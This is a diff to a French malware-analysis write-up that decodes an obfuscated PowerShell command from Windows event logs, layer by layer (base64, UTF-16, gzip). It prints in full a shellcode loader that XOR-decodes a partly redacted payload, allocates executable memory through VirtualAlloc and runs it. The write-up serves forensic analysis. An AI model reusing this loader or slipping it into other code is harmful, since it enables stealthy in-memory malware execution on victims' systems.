@@ -20,7 +20,7 @@ Dans les journaux d'évènements, les traces de commandes Powershell peuvent êt
 
 Nous allons décoder cette chaîne en base64 simplement avec Python :
 
-```Python
+```python
 >>> import io
 >>> import base64
 
@@ -32,7 +32,7 @@ b'$\x00s\x00=\x00N\x00e\x00w\x00-\x00O\x00b\x00j\x00e\x00c\x00t\x00 \x00I\x00O\x
 
 A la vue du résultat, les nombreux "\x00" nous ammènent à penser que la chaîne est encodée en UTF-16. Un coup de <code>decode("UTF-16")</code> et le tour est joué !
 
-```Python
+```python
 >>> base64.b64decode(data).decode("UTF-16")
 '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAK1W73PaOBP+HP4KfciM7SlQEnJp6E1mym/MC4TGJKHlGEbIMjERFkiyw[REEDACTED]"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
 ```
@@ -41,7 +41,7 @@ Nous obtenons un script Powershell qui semble contenir encore une couche d'encod
 
 Rebelotte, décodons la chaîne en base 64 avec Python.
 
-```Python
+```python
 >>> data = "H4sIAAAAAAAAAK1W73PaOBP+HP4KfciM7SlQEnJp6E1mym/MC4TGJKHlGEbIMjERFkiyw[REDACTED]"
 
 >>> base64.b64decode(data)
@@ -50,14 +50,60 @@ b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00\xadV\xefs\xda8\x13\xfe\x1c\xfe\n}\xc8
 
 Pas d'UTF-16 cette fois. En revanche, la chaîne est compressée. Dans le code Powershell obtenu, la chaîne est décodée puis décompressée <code>IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress)</code>. Ce que nous allons donc reproduire avec notre chaîne fraîchement décodée .
 
-```Python
+```python
 >>> zipped = io.BytesIO(base64.b64decode(data))
 >>> f = gzip.GzipFile(fileobj=zipped)
 >>> f.read()
 b"Set-StrictMode -Version 2\n\n$DoIt = @'\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0[REDACTED]')\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\t$var_code[$x] = $var_code[$x] -bxor 35\n}\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n'@\n\nIf ([IntPtr]::size -eq 8) {\n\tstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n\tIEX $DoIt\n}\n"
 ```
 
+Nous obtenons alors un script Powershell contenant encore une fois une donnée encodée en base 64. Cependant, une grande partie du code est lisible :
 
+```powershell
+Set-StrictMode -Version 2
+
+$DoIt = @'
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)		
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
+
+	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+	return $var_type_builder.CreateType()
+}
+
+[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs[REDACTED]')
+
+for ($x = 0; $x -lt $var_code.Count; $x++) {
+	$var_code[$x] = $var_code[$x] -bxor 35
+}
+
+$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+$var_runme.Invoke([IntPtr]::Zero)
+'@
+
+If ([IntPtr]::size -eq 8) {
+	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
+}
+else {
+	IEX $DoIt
+}
+```
 
 
 
